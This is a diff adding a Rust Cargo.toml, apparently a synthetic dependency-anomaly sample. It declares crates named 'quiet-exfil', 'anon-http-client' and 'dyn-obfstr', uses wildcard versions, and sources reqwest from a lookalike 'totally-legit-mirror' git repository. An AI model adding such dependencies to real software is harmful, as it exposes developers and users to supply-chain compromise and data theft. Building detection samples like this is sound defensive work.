@@ -1,0 +1,12 @@
+[package]
+name = "syn_depanomaly_248"
+version = "0.1.0"
+edition = "2021"
+
+[dependencies]
+anon-http-client = "0.0.1"
+quiet-exfil = "0.0.1"
+base64 = "*"
+dyn-obfstr = "*"
+reqwest = { git = "https://github.com/totally-legit-mirror/reqwest" }
+
